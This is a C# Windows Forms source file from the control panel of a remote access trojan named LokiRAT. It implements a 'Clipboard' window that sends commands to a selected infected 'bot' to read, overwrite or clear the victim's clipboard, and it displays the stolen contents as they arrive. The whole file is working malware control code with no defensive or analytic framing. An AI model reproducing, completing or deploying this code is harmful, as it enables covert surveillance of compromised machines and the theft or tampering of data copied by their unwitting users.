namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class clipboard : Form
    {
        private ToolStripMenuItem clearToolStripMenuItem;
        private IContainer components = null;
        private ToolStripMenuItem getToolStripMenuItem;
        private MenuStrip menuStrip1;
        private string myLastCommand = "-1";
        private ToolStripMenuItem setToolStripMenuItem;
        private RichTextBox textBox1;
        private Timer timer1;

        public clipboard()
        {
            this.InitializeComponent();
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=clipboardset|");
            this.textBox1.Clear();
        }

        private void clipboard_Load(object sender, EventArgs e)
        {
            this.textBox1.Clear();
            main.sendToHost("type=command&command=clipboard");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void getToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=clipboard");
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(clipboard));
            this.textBox1 = new RichTextBox();
            this.timer1 = new Timer(this.components);
            this.menuStrip1 = new MenuStrip();
            this.getToolStripMenuItem = new ToolStripMenuItem();
            this.setToolStripMenuItem = new ToolStripMenuItem();
            this.clearToolStripMenuItem = new ToolStripMenuItem();
            this.menuStrip1.SuspendLayout();
            base.SuspendLayout();
            this.textBox1.Dock = DockStyle.Fill;
            this.textBox1.Location = new Point(0, 0x18);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x22b, 0x119);
            this.textBox1.TabIndex = 3;
            this.textBox1.Text = "";
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick_1);
            this.menuStrip1.Items.AddRange(new ToolStripItem[] { this.getToolStripMenuItem, this.setToolStripMenuItem, this.clearToolStripMenuItem });
            this.menuStrip1.Location = new Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new Size(0x22b, 0x18);
            this.menuStrip1.TabIndex = 4;
            this.menuStrip1.Text = "menuStrip1";
            this.getToolStripMenuItem.Image = (Image) manager.GetObject("getToolStripMenuItem.Image");
            this.getToolStripMenuItem.Name = "getToolStripMenuItem";
            this.getToolStripMenuItem.Size = new Size(0x35, 20);
            this.getToolStripMenuItem.Text = "Get";
            this.getToolStripMenuItem.Click += new EventHandler(this.getToolStripMenuItem_Click);
            this.setToolStripMenuItem.Image = (Image) manager.GetObject("setToolStripMenuItem.Image");
            this.setToolStripMenuItem.Name = "setToolStripMenuItem";
            this.setToolStripMenuItem.Size = new Size(0x33, 20);
            this.setToolStripMenuItem.Text = "Set";
            this.setToolStripMenuItem.Click += new EventHandler(this.setToolStripMenuItem_Click);
            this.clearToolStripMenuItem.Image = (Image) manager.GetObject("clearToolStripMenuItem.Image");
            this.clearToolStripMenuItem.Name = "clearToolStripMenuItem";
            this.clearToolStripMenuItem.Size = new Size(0x3e, 20);
            this.clearToolStripMenuItem.Text = "Clear";
            this.clearToolStripMenuItem.Click += new EventHandler(this.clearToolStripMenuItem_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x22b, 0x131);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.menuStrip1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.MainMenuStrip = this.menuStrip1;
            base.Name = "clipboard";
            this.Text = "Clipboard | LokiRAT";
            base.Load += new EventHandler(this.clipboard_Load);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void setToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=clipboardset|" + this.textBox1.Text);
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    strArray = Regex.Split(main.lastCommandText[main.selectedBot], "{-c}");
                    if (strArray[0] == "LSclipboard")
                    {
                        this.textBox1.Text = strArray[1];
                    }
                }
            }
            catch
            {
            }
        }
    }
}

